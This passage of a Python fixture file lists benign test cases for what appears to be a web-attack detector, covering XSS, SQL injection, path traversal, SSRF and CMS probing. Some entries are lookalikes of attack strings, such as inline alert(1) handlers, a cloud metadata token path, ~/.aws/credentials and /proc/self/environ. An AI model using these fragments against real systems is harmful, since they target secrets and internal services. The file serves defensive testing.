        "xss_docs_onerror_callback_explainer",
        "The onError callback receives the exception object as its only argument.",
    ),
    BenignCase(
        "xss_custom_element_online_attribute_spaced_equals",
        '<user-badge online = "true">Online</user-badge>',
    ),
    BenignCase(
        "xss_log_line_online_once_attributes_spaced_equals",
        "metric check: value < threshold, online = true, once = 1",
    ),
    BenignCase(
        "xss_comparison_operator_onmessage_prose",
        "value < threshold; onmessage = handler",
    ),
    BenignCase(
        "xss_comparison_operator_onerror_prose",
        "Set retries < 5 then bind onerror = fallback in the config block.",
    ),
    BenignCase(
        "xss_comparison_operator_onclick_prose",
        "chat: score < 10, level up! onclick = celebrate();",
    ),
    BenignCase(
        "xss_comparison_operator_style_expression_prose",
        "value < 5; style = expression(alert(1))",
    ),
    BenignCase(
        "xss_comparison_operator_src_data_uri_prose",
        "Set threshold < 10 and src = data:text/html,ok",
    ),
    BenignCase(
        "xss_custom_element_oncall_attribute_spaced_equals",
        '<staff-badge oncall = "true">On call</staff-badge>',
    ),
    BenignCase(
        "xss_custom_element_onboarding_attribute_unspaced",
        '<div onboarding="true">Welcome</div>',
    ),
    BenignCase(
        "xss_div_oncustomthing_fictional_handler_not_reflected",
        '<div oncustomthing="alert(1)">',
    ),
    BenignCase(
        "xss_div_onpointerlockchange_non_reflected_handler",
        '<div onpointerlockchange="alert(1)">',
    ),
    BenignCase(
        "sqli_prose_select_few_items",
        "I'll select a few items from the catalog for you",
    ),
    BenignCase(
        "sqli_prose_select_candidates",
        "we will select candidates from the applicant pool",
    ),
    BenignCase(
        "sqli_prose_order_by_no_digit", "please order by phone or email when you can"
    ),
    BenignCase(
        "sqli_prose_drop_by_office",
        "We dropped the old table last quarter when we migrated to the new schema.",
    ),
    BenignCase(
        "sqli_json_query_select_from", '{"query": "SELECT id FROM cache", "ttl": 60}'
    ),
    BenignCase(
        "sqli_prose_where_equals_no_space",
        "Please specify where=kitchen for the delivery instructions.",
    ),
    BenignCase(
        "sqli_prose_select_join_no_from",
        "In the interview, she asked about SELECT and JOIN clauses in SQL.",
    ),
    BenignCase(
        "sqli_prose_1_equals_1_bug_report",
        "The bug was triggered by 1=1 always evaluating true in the validator.",
    ),
    BenignCase(
        "sqli_markdown_backtick_select",
        "Run `SELECT id FROM users` in the console to verify the migration.",
    ),
    BenignCase(
        "sqli_changelog_mysql_upgrade",
        "Upgraded MySQL and re-ran `ANALYZE TABLE` on the largest tables.",
    ),
    BenignCase("dir_traversal_filename_with_single_dotdot", "reports/../summary.csv"),
    BenignCase(
        "dir_traversal_prose_parent_directory",
        "Move the archive up one directory using the parent folder shortcut.",
    ),
    BenignCase(
        "dir_traversal_windows_path_no_dotdot",
        "C:\\Users\\alice\\Documents\\report.docx",
    ),
    BenignCase("dir_traversal_relative_path_no_dotdot", "./assets/images/logo.png"),
    BenignCase(
        "dir_traversal_etc_passwd_prose_mention",
        "The `/etc/passwd` file lists local user accounts on Unix systems.",
    ),
    BenignCase("dir_traversal_single_dotdot_no_repeat", "../shared/notes.txt"),
    BenignCase(
        "dir_traversal_single_dotdot_archive_path", "backup/../archive/2024.tar.gz"
    ),
    BenignCase(
        "dir_traversal_prose_two_dots_explainer",
        "Parent directories are referenced with two dots in Unix shells.",
    ),
    BenignCase("path_traversal_url_with_percent_20", "search?q=hello%20world"),
    BenignCase("path_traversal_url_encoded_slash_only", "path%2Fto%2Ffile"),
    BenignCase(
        "path_traversal_prose_percent_encoding",
        "The percent-encoding for a space character is %20 in URLs.",
    ),
    BenignCase("path_traversal_percent_25_off", "search?tag=100%25off"),
    BenignCase(
        "path_traversal_prose_percent20_percent2f",
        "URL-encoded spaces use %20 while encoded slashes use %2F.",
    ),
    BenignCase(
        "path_traversal_benign_single_segment_relative_image",
        "../assets/logo.png",
    ),
    BenignCase(
        "path_traversal_benign_encoded_slash_without_dotdot",
        "assets%2Flogo.png",
    ),
    BenignCase(
        "path_traversal_benign_encoded_space_not_a_separator",
        "..%20file",
    ),
    BenignCase(
        "path_traversal_benign_encoded_slash_redirect_param",
        "redirect=%2fdashboard",
    ),
    BenignCase(
        "dir_traversal_benign_nfkc_ellipsis_dot_truncation_shape",
        "….//path",
    ),
    BenignCase(
        "dir_traversal_benign_loading_dots_progress_indicator",
        "Loading........//please wait",
    ),
    BenignCase(
        "dir_traversal_benign_document_section_reference",
        "Section 4....//5",
    ),
    BenignCase(
        "dir_traversal_benign_version_string_with_slashes",
        "v1.2.3....//legacy",
    ),
    BenignCase(
        "dir_traversal_benign_glob_pattern_query_value",
        "glob=**/....//node_modules",
    ),
    BenignCase(
        "cmd_injection_markdown_ls_mention", "Run `ls` to list files in the directory."
    ),
    BenignCase(
        "cmd_injection_markdown_curl_snippet",
        "Try `curl -X GET` against the users endpoint.",
    ),
    BenignCase(
        "cmd_injection_sql_backtick_identifier",
        "SELECT `id`, `name` FROM `users` WHERE `active` = 1",
    ),
    BenignCase(
        "cmd_injection_js_template_literal_url",
        "const url = `https://api.example.com/users/${userId}`;",
    ),
    BenignCase(
        "cmd_injection_prose_semicolon_sentence", "first do this; then enjoy your day"
    ),
    BenignCase(
        "cmd_injection_backtick_wrapped_dollar_paren", "see the `$(id)` example"
    ),
    BenignCase("cmd_injection_shell_docs_var_expansion", "export PATH=${HOME}/bin"),
    BenignCase(
        "cmd_injection_shell_path_mention_without_flag",
        "The path /bin/sh is the default shell on many systems.",
    ),
    BenignCase(
        "cmd_injection_env_command_mention_without_shell",
        "Check your `env` for the missing `PATH` entry.",
    ),
    BenignCase(
        "cmd_injection_changelog_reboot_mention",
        "The `reboot` command now requires confirmation.",
    ),
    BenignCase(
        "cmd_injection_prose_double_ampersand_operator",
        "&& is the logical AND operator in most C-like languages.",
    ),
    BenignCase(
        "cmd_injection_commit_message_docker_bump",
        "chore: bump `docker` base image to 3.12-slim",
    ),
    BenignCase(
        "cmd_injection_sql_dotted_qualified_identifier",
        "SELECT `u`.`id` FROM `users` `u` JOIN `orders` `o` ON `u`.`id` = `o`.`uid`",
    ),
    BenignCase(
        "cmd_injection_json_wrapped_backtick_value",
        '{"tip": "use `curl` to fetch the resource", "example": "`wget` the release '
        'archive"}',
    ),
    BenignCase("file_inclusion_ordinary_https_url", "https://example.com/path?a=1"),
    BenignCase("file_inclusion_ordinary_http_url", "http://example.com"),
    BenignCase(
        "file_inclusion_json_webhook_url",
        '{"callback_url": "https://api.customer.com/webhook"}',
    ),
    BenignCase(
        "file_inclusion_prose_docs_link",
        "see https://github.com/rennf93/guard-core for the source",
    ),
    BenignCase(
        "file_inclusion_query_string_encoded",
        "https://example.com/callback?redirect=%2Fhome",
    ),
    BenignCase("file_inclusion_ipv6_literal_url", "https://[2001:db8::1]/path"),
    BenignCase("file_inclusion_ftp_url", "ftp://ftp.example.com/pub/file.txt"),
    BenignCase(
        "file_inclusion_redirect_uri_callback",
        "redirect_uri=https://myapp.com/callback",
    ),
    BenignCase("file_inclusion_next_dashboard", "next=https://example.com/dashboard"),
    BenignCase("file_inclusion_url_cdn_asset", "url=https://cdn.example.com/asset.js"),
    BenignCase("file_inclusion_return_home", "return=https://example.com/home"),
    BenignCase(
        "file_inclusion_returnto_profile",
        "returnTo=https://app.example.com/profile",
    ),
    BenignCase(
        "file_inclusion_continue_checkout",
        "continue=https://shop.example.com/checkout",
    ),
    BenignCase(
        "file_inclusion_callback_oauth",
        "callback=https://auth.example.com/oauth/complete",
    ),
    BenignCase(
        "file_inclusion_benign_readme_txt_link",
        "download=https://raw.githubusercontent.com/user/repo/main/README.txt",
        "production",
        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
    ),
    BenignCase(
        "file_inclusion_benign_docs_readme_txt_link",
        "return=https://example.com/docs/readme.txt",
        "production",
        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
    ),
    BenignCase(
        "file_inclusion_benign_terms_txt_link",
        "file=https://example.com/legal/terms.txt",
        "production",
        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
    ),
    BenignCase(
        "file_inclusion_benign_installer_sh_link",
        "url=https://example.com/install.sh",
    ),
    BenignCase(
        "file_inclusion_benign_docker_installer_sh_link",
        "url=https://get.docker.com/install.sh",
    ),
    BenignCase(
        "file_inclusion_benign_cgi_search_link",
        "url=https://legacy.example.com/cgi-bin/search.cgi",
    ),
    BenignCase(
        "ldap_prose_wildcard_search_mention",
        "Use an asterisk wildcard in your search query to match partial names.",
    ),
    BenignCase(
        "ldap_prose_and_or_boolean_logic",
        "The filter combines AND and OR boolean logic for the report.",
    ),
    BenignCase(
        "ldap_markdown_equals_example",
        "Set `role = admin` in the config to grant elevated access.",
    ),
    BenignCase(
        "ldap_prose_directory_lookup",
        "The directory lookup returned all users in the marketing group.",
    ),
    BenignCase(
        "ldap_prose_bind_service_account",
        "The LDAP bind used a service account with read-only scope.",
    ),
    BenignCase(
        "ldap_prose_filter_syntax_explainer",
        "Filter syntax in LDAP uses parentheses to group conditions.",
    ),
    BenignCase("ldap_lookalike_maths_expression", "total = a*)(b+c)"),
    BenignCase(
        "ldap_lookalike_footnote_reference",
        "See appendix A*)(footnote 3) for details",
    ),
    BenignCase(
        "ldap_ops_log_chained_filter_objectclass_department",
        "Our nightly sync uses filter: (objectClass=*)(department=Sales) and it "
        "worked fine.",
    ),
    BenignCase(
        "ldap_ops_log_chained_filter_uid_status",
        "search_filter: (uid=*)(status=active)",
    ),
    BenignCase(
        "xml_ordinary_declaration_no_entity",
        '<?xml version="1.0" encoding="UTF-8"?><note><body>Hello</body></note>',
    ),
    BenignCase(
        "xml_prose_cdata_explainer",
        "A CDATA section lets you embed raw text without escaping special characters.",
    ),
    BenignCase(
        "xml_prose_entity_explainer",
        "An XML entity like `&amp;` represents a reserved character.",
    ),
    BenignCase(
        "xml_config_snippet_no_doctype",
        "<settings><timeout>30</timeout><retries>3</retries></settings>",
    ),
    BenignCase(
        "xml_prose_soap_envelope",
        "The SOAP envelope wraps the XML body in a standard namespace.",
    ),
    BenignCase("ssrf_known_good_benign_stripe", "https://api.stripe.com/v1/charges"),
    BenignCase("ssrf_known_good_benign_github", "https://github.com/anthropics/claude"),
    BenignCase("ssrf_version_like_text", "software 10.4.2 release"),
    BenignCase(
        "ssrf_bare_two_octet_prefix", "192.168 is a common prefix in networking docs"
    ),
    BenignCase("ssrf_public_dns_google", "http://8.8.8.8/"),
    BenignCase("ssrf_localhost_lookalike_domain", "localhost.example.com/callback"),
    BenignCase("ssrf_notlocalhost_domain", "https://notlocalhost.io/status"),
    BenignCase("ssrf_ipv4_mapped_ipv6_public_bracket", "http://[::ffff:8.8.8.8]/"),
    BenignCase("ssrf_private_ip_lookalike_domain", "https://192-168-1-1.nip.io/"),
    BenignCase(
        "ssrf_aws_apigateway_url",
        "https://apigateway.us-east-1.amazonaws.com/prod/resource",
    ),
    BenignCase(
        "ssrf_slack_webhook_url", "https://hooks.slack.com/services/T000/B000/XXXX"
    ),
    BenignCase("ssrf_scheme_port_redis", "redis://6379"),
    BenignCase("ssrf_scheme_port_grpc", "grpc://50051"),
    BenignCase("ssrf_scheme_port_amqp", "amqp://5672"),
    BenignCase("ssrf_scheme_port_https_path", "https://2023/blog"),
    BenignCase(
        "ssrf_scheme_port_tcp_prose",
        "connect via tcp://8080 for the health probe",
    ),
    BenignCase(
        "ssrf_bare_private_ip_upstream_query_param_value",
        "10.0.0.5",
        known_false_positive_reason=(
            _SSRF_BARE_PRIVATE_IP_NO_URL_CONTEXT_KNOWN_FP_REASON
        ),
    ),
    BenignCase(
        "ssrf_bare_private_ip_internal_ip_header_value",
        "10.0.0.5",
        known_false_positive_reason=(
            _SSRF_BARE_PRIVATE_IP_NO_URL_CONTEXT_KNOWN_FP_REASON
        ),
    ),
    BenignCase(
        "ssrf_bare_private_ip_host_query_param_value",
        "192.168.1.10",
        known_false_positive_reason=(
            _SSRF_BARE_PRIVATE_IP_NO_URL_CONTEXT_KNOWN_FP_REASON
        ),
    ),
    BenignCase(
        "ssrf_bare_private_ip_json_body_field_value",
        "10.0.0.5",
        known_false_positive_reason=(
            _SSRF_BARE_PRIVATE_IP_NO_URL_CONTEXT_KNOWN_FP_REASON
        ),
    ),
    BenignCase(
        "rest_path_gcp_computeMetadata_no_default_segment",
        "computeMetadata/v1/instance/hostname",
    ),
    BenignCase(
        "rest_path_aws_creds_prose_mention",
        "Loaded credentials from ~/.aws/credentials",
    ),
    BenignCase(
        "rest_path_s3_key_realistic",
        "s3://my-bucket/uploads/2024/01/15/report-final-v2-reviewed.pdf",
    ),
    BenignCase(
        "rest_path_git_sha_full_hex",
        "a618a05f4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e",
    ),
    BenignCase(
        "rest_path_opaque_session_token_non_jwt",
        "sess_9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a",
    ),
    BenignCase(
        "rest_path_regression10_gcp_computeMetadata_default_segment",
        "computeMetadata/v1/instance/service-accounts/default/token",
    ),
    BenignCase(
        "rest_path_regression10_aws_creds_bare_path",
        "~/.aws/credentials",
    ),
    BenignCase(
        "rest_path_k8s_default_namespace_pods",
        "/api/v1/namespaces/default/pods",
    ),
    BenignCase("nosql_benign_dollar_value_price", '{"price":"$25","name":"coffee"}'),
    BenignCase(
        "nosql_benign_plain_query_object", '{"username": "alice", "role": "admin"}'
    ),
    BenignCase(
        "nosql_prose_mongodb_operator_mention",
        "MongoDB operators like $gt and $lt let you build range queries.",
    ),
    BenignCase(
        "nosql_benign_nested_object_no_operator",
        '{"address": {"city": "Berlin", "zip": "10115"}}',
    ),
    BenignCase(
        "nosql_benign_cart_total_object",
        '{"cart_total": {"currency": "USD", "amount": 42.5}}',
    ),
    BenignCase(
        "nosql_prose_aggregation_pipeline",
        "MongoDB aggregation pipelines chain multiple stage operators together.",
    ),
    BenignCase("nosql_benign_bare_bracket_empty_array", "arr[]=1"),
    BenignCase("nosql_benign_bare_bracket_object_key", "obj[key]=val"),
    BenignCase("nosql_benign_bare_bracket_numeric_index", "order[0]=asc"),
    BenignCase("nosql_benign_bare_bracket_status_key", "filter[status]=active"),
    BenignCase("nosql_benign_bare_bracket_nested_index", "items[2][name]=x"),
    BenignCase("file_upload_benign_png_filename", 'filename="avatar.png"'),
    BenignCase("file_upload_benign_pdf_filename", 'filename="invoice.pdf"'),
    BenignCase("file_upload_benign_docx_filename", "filename='report.docx'"),
    BenignCase(
        "file_upload_prose_upload_limits",
        "Uploaded files are limited to 10 MB and must be JPEG or PNG.",
    ),
    BenignCase(
        "file_upload_prose_ticket_dangerous_filename_spaced_equals",
        "Ticket #4821: please confirm the attachment filename = "
        '"invoice.php" was renamed correctly before closing.',
    ),
    BenignCase("file_upload_benign_pptx_filename", 'filename="presentation.pptx"'),
    BenignCase(
        "file_upload_prose_accepted_formats",
        "Accepted upload formats are PNG, JPG, and PDF only.",
    ),
    BenignCase(
        "template_benign_mustache_interpolation",
        "The template uses `{{ user.name }}` for interpolation.",
    ),
    BenignCase(
        "template_benign_jinja_if_block",
        "Our Jinja template renders `{% if active %}` blocks conditionally.",
    ),
    BenignCase(
        "template_benign_dollar_brace_var",
        "Set the amount with ${amount} in the template.",
    ),
    BenignCase(
        "template_benign_makefile_variable",
        "The Makefile references $(CC) and $(CFLAGS) for the compiler.",
    ),
    BenignCase(
        "template_prose_erb_explainer",
        "ERB templates use `<%= %>` to output Ruby expressions in HTML.",
    ),
    BenignCase(
        "template_prose_handlebars_explainer",
        "Handlebars templates use double curly braces {{ }} for variable "
        "interpolation.",
    ),
    BenignCase(
        "http_split_prose_crlf_explainer",
        "CRLF stands for carriage return and line feed, used to end HTTP header lines.",
    ),
    BenignCase(
        "http_split_benign_multiline_body",
        "Line one of the message.\nLine two of the message.\nLine three.",
    ),
    BenignCase(
        "http_split_prose_location_header_mention",
        "The `Location` header is set by the server to trigger a redirect.",
    ),
    BenignCase(
        "http_split_prose_set_cookie_mention",
        "The response included a `Set-Cookie` header for session tracking.",
    ),
    BenignCase(
        "http_split_prose_redirect_mention",
        "Redirects use the `Location` header with a 302 status code.",
    ),
    BenignCase(
        "sensitive_file_benign_env_example",
        "See `.env.example` for the list of required environment variables.",
    ),
    BenignCase(
        "sensitive_file_benign_readme_reference",
        "Please review `README.md` before opening a PR.",
    ),
    BenignCase(
        "sensitive_file_benign_settings_yml_mention",
        "See the config file `settings.yml` for defaults.",
    ),
    BenignCase(
        "sensitive_file_benign_source_extension_prose",
        "Our backend is written in Python (`.py`) and Go (`.go`).",
    ),
    BenignCase("cms_probing_robots_txt", "/robots.txt"),
    BenignCase("cms_probing_sitemap_xml", "/sitemap.xml"),
    BenignCase("cms_probing_security_txt", "/security.txt"),
    BenignCase(
        "cms_probing_prose_wordpress_mention",
        "We migrated our blog off WordPress last year.",
    ),
    BenignCase(
        "cms_probing_prose_htaccess_backup_reminder",
        "Please back up /var/www/html/.htaccess before deploying the release.",
    ),
    BenignCase(
        "cms_probing_prose_wp_admin_config_mirror_mention",
        "Check the config under /opt/app/wp-admin/ for the legacy mirror.",
    ),
    BenignCase(
        "cms_probing_prose_support_ticket_wp_admin_link",
        "Customer sent us this link: https://shop.example.com/wp-admin/plugins.php "
        "please advise.",
    ),
    BenignCase(
        "cms_probing_prose_docs_wp_admin_link",
        "See notes at https://docs.example.com/wp-admin/setup-config.php for "
        "migration steps.",
    ),
    BenignCase(
        "cms_probing_prose_redirect_notification_wp_admin_setup_config",
        "Redirecting to http://example.com/wp-admin/setup-config.php now",
    ),
    BenignCase("recon_robots_txt", "/robots.txt"),
    BenignCase("recon_sitemap_xml", "/sitemap.xml"),
    BenignCase("recon_security_txt", "/security.txt"),
    BenignCase(
        "recon_prose_actuator_explainer",
        "Spring Boot actuator endpoints expose health and metrics data.",
    ),
    BenignCase(
        "recon_prose_prometheus_actuator_scrape_mention",
        "Prometheus scrapes /metrics/actuator/health every 30 seconds.",
    ),
    BenignCase("recon_normal_api_route", "/api/v1/users/42"),
    BenignCase("recon_rest_route_api_version", "/api/version"),
    BenignCase("recon_rest_route_nested_system_health", "/app/system/health"),
    BenignCase("recon_rest_route_versioned_system_status", "/api/v2/system/status"),
    BenignCase(
        "proto_pollution_benign_prototype_docs",
        "JavaScript objects inherit from `Object.prototype` by default.",
    ),
    BenignCase(
        "proto_pollution_benign_constructor_mention",
        "The `constructor` property points back to the class that created "
        "the instance.",
    ),
    BenignCase(
        "proto_pollution_benign_admin_flag_json", '{"role": "admin", "active": true}'
    ),
    BenignCase(
        "proto_pollution_prose_tutorial_reference",
        "The class `__proto__` reference is used to explain JS inheritance "
        "in the tutorial.",
    ),
    BenignCase(
        "proto_pollution_benign_constructor_value",
        '{"user": {"name": "alice", "constructor": "Employee"}}',
    ),
    BenignCase("proto_pollution_benign_constructor_name_access", "a.constructor.name"),
    BenignCase("proto_pollution_benign_bare_constructor_param", "constructor"),
    BenignCase("proto_pollution_benign_bare_prototype_param", "prototype"),
    BenignCase(
        "code_injection_prose_reflection_explainer",
        "Reflection lets a program inspect its own types at runtime.",
    ),
    BenignCase(
        "code_injection_prose_process_class_mention",
        "The `Process` class in .NET wraps native OS process handles.",
    ),
    BenignCase(
        "code_injection_changelog_assembly_bump",
        "Bumped the shared `Assembly` version to 4.2.0 in this release.",
    ),
    BenignCase(
        "code_injection_prose_process_wrapper_explainer",
        "The `Process` class wraps native OS handles for spawning child processes.",
    ),
    BenignCase(
        "code_injection_prose_reflection_serialization",
        "Reflection-based serialization is slower than direct field access.",
    ),
    BenignCase(
        "benign_user_agent_chrome_windows",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    ),
    BenignCase(
        "benign_user_agent_iphone_safari",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) "
        "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 "
        "Safari/604.1",
    ),
    BenignCase("benign_user_agent_python_requests", "python-requests/2.31.0"),
    BenignCase("benign_user_agent_curl", "curl/8.4.0"),
    BenignCase(
        "benign_git_diff_snippet",
        "diff --git a/src/utils.py b/src/utils.py\n--- a/src/utils.py\n"
        "+++ b/src/utils.py\n@@ -10,7 +10,7 @@ def parse(x):\n"
        "-    return x.strip()\n+    return x.strip().lower()",
    ),
    BenignCase(
        "benign_json_semicolon_pipe_in_value",
        '{"description": "Use semicolons; separate values with pipes | when '
        'exporting CSV.", "id": 42}',
    ),
    BenignCase(
        "benign_oauth_redirect_callback",
        "https://app.example.com/oauth/callback?code=abc123&state=xyz789",
    ),
    BenignCase(
        "benign_s3_bucket_asset_url",
        "https://my-app-assets.s3.amazonaws.com/uploads/avatar-42.png",
    ),
    BenignCase(
        "benign_cdn_jsdelivr_url",
        "https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js",
    ),
    BenignCase(
        "benign_file_path_var_www_html",
        "/var/www/html/index.html",
    ),
    BenignCase(
        "benign_webhook_payment_succeeded",
        '{"event": "payment.succeeded", "data": {"amount": 4999, "currency": "usd"}}',
    ),
    BenignCase(
        "benign_changelog_version_entry",
        "3.11.2 - Fixed a race condition in the rate limiter and updated dependencies.",
    ),
    BenignCase(
        "benign_base64_wrapped_greeting",
        "token=R29vZCBtb3JuaW5nIHRlYW0sIHN0YW5kdXAgbm90ZXMgYXR0YWNoZWQgYmVsb3cu",
        "encoding_aware",
    ),
    BenignCase(
        "benign_base64_wrapped_receipt",
        "VGhhbmsgeW91IGZvciB5b3VyIHB1cmNoYXNlLCB5b3VyIG9yZGVyIHdpbGwgc2hpcCB3"
        "aXRoaW4gdHdvIGJ1c2luZXNzIGRheXMu",
        "encoding_aware",
    ),
    BenignCase(
        "benign_base64_wrapped_changelog",
        "UmVmYWN0b3JlZCB0aGUgYmlsbGluZyBtb2R1bGUgYW5kIGNsZWFuZWQgdXAgZGVhZCBj"
        "b2RlIGluIHRoZSBpbnZvaWNlIHBpcGVsaW5lLg==",
        "encoding_aware",
    ),
    BenignCase(
        "benign_past_truncation_cutoff_closing_sentence",
        _TRUNCATION_FILLER + "the end of this long benign report is just a "
        "closing sentence.",
        "encoding_aware",
    ),
    BenignCase(
        "sensitive_file_git_diff_ending_python_source",
        "diff --git a/src/utils.py b/src/utils.py\n--- a/src/utils.py\n"
        "+++ b/src/utils.py",
    ),
    BenignCase(
        "sensitive_file_log_line_ending_dotenv",
        "2026-08-11T10:22:03Z INFO deploy: copied template into /srv/app/.env",
    ),
    BenignCase(
        "sensitive_file_dockerfile_ending_python_source",
        "FROM python:3.12-slim\nWORKDIR /app\nCOPY requirements.txt .\n"
        "RUN pip install -r requirements.txt\nCOPY app/main.py /app/main.py",
    ),
    BenignCase(
        "sensitive_file_release_note_ending_config_yml",
        "Release 3.12.0 updates the default timeout values.\nSee infra/app-config.yml",
    ),
    BenignCase(
        "sensitive_file_cdn_note_ending_sourcemap",
        "Deploy pipeline uploaded new build artifacts.\nUploaded dist/bundle.js.map",
    ),
    BenignCase(
        "sensitive_file_shell_log_ending_deploy_sh",
        "Provisioning log:\nExecuted post-install hook scripts/deploy.sh",
    ),
    BenignCase(
        "sensitive_file_release_note_ending_go_source",
        "Refactored the payments module for clarity.\n"
        "Updated services/payments/handler.go",
    ),
    BenignCase(
        "sensitive_file_changelog_ending_sql_migration",
        "3.12.0 changelog:\n- Added index on users table\n"
        "Run the migration via db/migrate.sql",
    ),
    BenignCase(
        "sensitive_file_multiline_ending_git_dir",
        "Build artifacts were generated inside a scratch checkout at /tmp/build/.git",
    ),
    BenignCase(
        "sensitive_file_json_payload_ending_source_path",
        '{"event": "file_watch", "changed": true, "path": "/opt/app/worker.py"}',
    ),
    BenignCase(
        "sensitive_file_stack_trace_ending_source_path",
        "Unhandled exception while loading configuration.\n"
        "  at bootstrap (app/bootstrap.js:12)\n"
        "  at Module._compile (module.js:456)\n"
        "Failed to load /app/config/settings.py",
    ),
    BenignCase(
        "requirements_txt_style_multiline_benign",
        "flask==3.0.3\nrequests==2.32.3\npydantic==2.9.2\nredis==5.0.8\nhttpx==0.27.2",
    ),
    BenignCase(
        "dir_traversal_incident_note_ending_etc_passwd",
        "Investigating auth issues.\nUser confirmed the target file was /etc/passwd",
    ),
    BenignCase(
        "dir_traversal_incident_note_midline_etc_passwd",
        "Investigating auth issues.\n"
        "User confirmed the target file was /etc/passwd\n"
        "Ticket resolved, closing now.",
    ),
    BenignCase(
        "dir_traversal_setup_log_ending_win_ini",
        "Setup log:\nBackup restored win.ini",
    ),
    BenignCase(
        "dir_traversal_debug_trace_ending_proc_environ",
        "Debug trace:\nDumped /proc/self/environ",
    ),
    BenignCase(
        "dir_traversal_ops_report_ending_var_log",
        "Report:\nRotated /var/log/nginx",
    ),
    BenignCase(
        "path_traversal_url_note_ending_percent2f",
        "Redirect target uses percent-encoding.\n"
        "User was redirected to %2Fadmin%2Fsettings",
    ),
    BenignCase(
        "path_traversal_changelog_ending_percent_encoded_space",
        "Release notes:\n- Fixed a bug in URL decoding\n"
        "Example input now renders as hello%20world",
    ),
    BenignCase(
        "file_inclusion_release_notes_ending_https_url",
        "3.12.0 changelog:\n- Bumped the CDN asset pipeline\n"
        "New script tag points to https://cdn.example.com/app.js",
    ),
    BenignCase(
        "file_inclusion_docs_ending_ftp_url",
        "Legacy download docs:\n"
        "Older clients should use ftp://ftp.example.com/pub/readme.txt",
    ),
    BenignCase(
        "sqli_orderby_pagination_note_multiline",
        "Migration notes:\nFor pagination consistency, always ORDER BY 2\n"
        "before paginating results.",
    ),
    BenignCase(
        "sqli_shell_comment_hash_multiline",
        "Example shell command:\necho 'debug' #\nEnables verbose output.",
    ),
    BenignCase(
        "cmd_injection_shell_script_excerpt_multiline",
        "Deployment script:\nsh -x deploy.sh\necho done",
    ),
    BenignCase(
        "cms_probing_role_list_administrator_multiline",
        "Available roles for this workspace:\nadministrator\neditor\nviewer\n"
        "Contact support for role changes.",
    ),
    BenignCase(
        "cms_probing_bullet_list_wp_admin_alone_on_line",
        "Available admin paths historically used:\nwp-admin\nRemove legacy references.",
    ),
    BenignCase(
        "cms_probing_bullet_list_htaccess_alone_on_line",
        "Files reviewed during the audit:\n.htaccess\nNo secrets found.",
    ),
    BenignCase(
        "cms_probing_deprecated_scripts_list_multiline",
        "Deprecated scripts:\ntest.php\ninfo.php\nRemove these before production.",
    ),
    BenignCase(
        "cms_probing_cleanup_backup_files_multiline",
        "Files pending cleanup:\nsettings.py.orig\ndata.tmp\n"
        "Please review before merge.",
    ),
    BenignCase(
        "cms_probing_gitignore_style_list_multiline",
        "Files to ignore in this repo:\n.DS_Store\nThumbs.db\n.npmrc\n"
        "Add more as needed.",
    ),
    BenignCase(
        "recon_retired_pages_list_multiline",
        "Legacy pages retired this quarter:\nhome.shtml\ncontact.cgi\n"
        "Reach out with questions.",
    ),
    BenignCase(
        "recon_api_routes_doc_multiline",
        "Internal routes reference:\n/version\n/health\n/metrics",
    ),
    BenignCase(
        "recon_endpoints_list_multiline",
        "Endpoints exposed by this service:\nactuator\nswagger-ui\n"
        "Remove before going to prod.",
    ),
    BenignCase(
        "recon_internal_tools_list_multiline",
        "Internal tools we use:\nconfluence\nhelpdesk\njira",
    ),
    BenignCase(
        "recon_legacy_cgi_paths_doc_multiline",
        "Legacy web server paths still referenced in docs:\n"
        "cgi-bin/old-form.cgi\nDo not use in new code.",
    ),
    BenignCase(
        "recon_iot_audit_findings_multiline",
        "IoT device audit findings:\nHNAP1\nIPCamDesc.xml\n"
        "Flagged for firmware update.",
    ),
    BenignCase(
        "recon_i18n_routes_doc_multiline",
        "Supported i18n routes:\n/languages/en\n/languages/fr\n"
        "Add more locales as needed.",
    ),
    BenignCase(
        "recon_vendor_inventory_multiline",
        "Vendor systems inventory:\nsap\nwsman\nDecommission by Q3.",
    ),
    BenignCase(
        "recon_bot_integrations_list_multiline",
        "Bot integrations enabled:\n.clawdbot\nRemove unused integrations.",
    ),
    BenignCase(
        "recon_spanish_routes_doc_multiline",
        "Spanish site routes:\n/inicio\n/indice\nTranslate remaining pages.",
    ),
    BenignCase(
        "recon_dev_tooling_folders_multiline",
        "Dev tooling folders in this repo:\n.streamlit\n.devcontainer\n"
        "Add to .gitignore.",
    ),
    BenignCase(
        "recon_build_files_pr_multiline",
        "Build files added in this PR:\nDockerfile\nMakefile\nJenkinsfile\n"
        "Ready for review.",
    ),
    BenignCase(
        "recon_removed_secrets_files_multiline",
        "Files removed for security reasons:\nold_secrets.yml\n"
        "legacy_credentials.json\nAudit complete.",
    ),
    BenignCase(
        "recon_proxy_autodiscover_paths_multiline",
        "Exchange-related paths in our proxy config:\nautodiscover/\n"
        "Do not cache these responses.",
    ),
    BenignCase(
        "recon_doh_endpoints_doc_multiline",
        "DoH endpoints supported:\n/dns-query\nSee RFC 8484 for details.",
    ),
    BenignCase(
        "recon_git_troubleshooting_note_multiline",
        "Git repo troubleshooting notes:\nCorruption found in:\n"
        ".git/objects\n.git/refs\nRan git fsck to repair.",
    ),
    BenignCase(
        "cms_probing_prose_support_ticket_plugins_reference",
        "Customer support referenced the plugins page at /wp-admin/plugins.php "
        "in their ticket.",
    ),
    BenignCase(
        "cms_probing_prose_onboarding_notes_wp_login_reference",
        "The onboarding notes mention /wp-login.php as the old staging login page.",
    ),
    BenignCase(
        "cms_probing_prose_legacy_docs_xmlrpc_reference",
        "Please review /xmlrpc.php in the legacy docs before removing it.",
    ),
    BenignCase(
        "cms_probing_prose_archive_backup_phpinfo_reference",
        "Our archive still has a backup copy of /phpinfo.php from 2019.",
    ),
    BenignCase(
        "cms_probing_prose_changelog_install_php_removal",
        "The changelog mentions removing /wp-admin/install.php from the demo site.",
    ),
